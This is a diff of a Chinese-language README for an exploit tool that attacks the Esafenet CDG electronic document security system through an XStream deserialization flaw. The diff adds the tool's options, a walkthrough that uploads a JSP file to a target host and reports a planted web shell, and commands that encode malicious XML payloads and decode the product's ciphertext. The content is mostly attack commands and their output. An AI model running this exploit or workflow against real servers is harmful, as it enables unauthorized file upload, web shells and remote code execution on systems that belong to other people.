@@ -5,28 +5,57 @@
 
 ## 使用
 
-本地文件上传利用
+帮助信息
 
 ```bash
-~/GitHub/CDGXStreamDeserRCE  ‹main*› $ cat tessssssssssssst1.jsp
+$ java -jar CDGXStreamDeserRCE.jar   
+亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用
+
+usage: Options
+ -d,--decode <arg>         密文解码
+ -e,--encode <arg>         加密XML反序列化payload
+ -h,--help                 打印帮助信息
+ -p,--proxy <arg>          代理地址
+ -t,--target <arg>         目标URL
+ -uf,--upload-file <arg>    上传文件的本地路径
+```
+
+文件上传利用
+
+```bash
+$ cat test1.jsp
 <%
 out.println("e165421110ba030e165421110ba03099a1c0393373c5b4399a1c0393373c5b43");
 %>
-~/GitHub/CDGXStreamDeserRCE  ‹main*› $ java -jar CDGXStreamDeserRCE.jar -p http://127.0.0.1:8080 -uf tessssssssssssst1.jsp -t https://192.168.31.190:8443
+$ java -jar CDGXStreamDeserRCE.jar -p http://127.0.0.1:8080 -uf test1.jsp -t https://192.168.31.190:8443
 [+] Exploit Successed
-[+] WebShell: https://192.168.31.190:8443/CDGServer3/tessssssssssssst1.jsp
-~/GitHub/CDGXStreamDeserRCE  ‹main*› $ curl -k https://192.168.31.190:8443/CDGServer3/tessssssssssssst1.jsp
+[+] WebShell: https://192.168.31.190:8443/CDGServer3/test1.jsp
+$ curl -k https://192.168.31.190:8443/CDGServer3/test1.jsp
 e165421110ba030e165421110ba03099a1c0393373c5b4399a1c0393373c5b43
 ```
 
 密文解码
 
 ```bash
-~/GitHub/CDGXStreamDeserRCE  ‹main*› $ java -jar CDGXStreamDeserRCE.jar -d FEPCCCLCENHIPOAFPAPDDFCGEAPNMDBMOJPMJAKKNPHOKIKIDCBPHEGKLDGNHCBDEIMODEKMKPFBAIMMNLOJJKMIICLAPJAAFGNGAKFBMPKPJMOIKODEJJMHJCCHKBMFMMFDLOMDPABOJCEAPOFDCPMKGDHFNBBIMCIPAMMIIANFPAJHFAABLLLANNIDAGNKOHONJGFGBKHFDMCLJIMICBHBJEIAAIMACN
+$ java -jar CDGXStreamDeserRCE.jar -d FEPCCCLCENHIPOAFPAPDDFCGEAPNMDBMOJPMJAKKNPHOKIKIDCBPHEGKLDGNHCBDEIMODEKMKPFBAIMMNLOJJKMIICLAPJAAFGNGAKFBMPKPJMOIKODEJJMHJCCHKBMFMMFDLOMDPABOJCEAPOFDCPMKGDHFNBBIMCIPAMMIIANFPAJHFAABLLLANNIDAGNKOHONJGFGBKHFDMCLJIMICBHBJEIAAIMACN
+[+] Decode Successed:
+<?xml version='1.0' encoding="gb2312"?>
+<SystemReturn>
+  <returnMessage>Error1200</returnMessage>
+</SystemReturn>
 ```
-<img width="1624" alt="image" src="https://user-images.githubusercontent.com/40891670/209945515-1539ff6b-e4c4-46a3-8764-7aa3a7568741.png">
 
+明文编码，读取文件内容进行编码或直接对字符串进行编码
 
-## References
+```bash
+$ java -jar CDGXStreamDeserRCE.jar -e payload.xml
+
+```
+```bash
+$ java -jar CDGXStreamDeserRCE.jar -e "C:\Program Files (x86)\ESAFENET\CDocGuard Server\tomcat64\webapps\CDGServer3"
+BCBILAKIDOOOCGKJDBBFOCGJFGFJPNJALCHEBLGLBFAMKDDLPBCFFJCJHOPGLEACMIOHIFJAGCBPOMIKLMGBAGCNBGEGNKGALLCGLOJNJBHCLMNNGHHJJNAAKPMEDFJDGCEMDADGDCEFFCGEGNFLGHCH
+```
+
+## 参考
 
 - https://github.com/woodpecker-framework/ysoserial-for-woodpecker
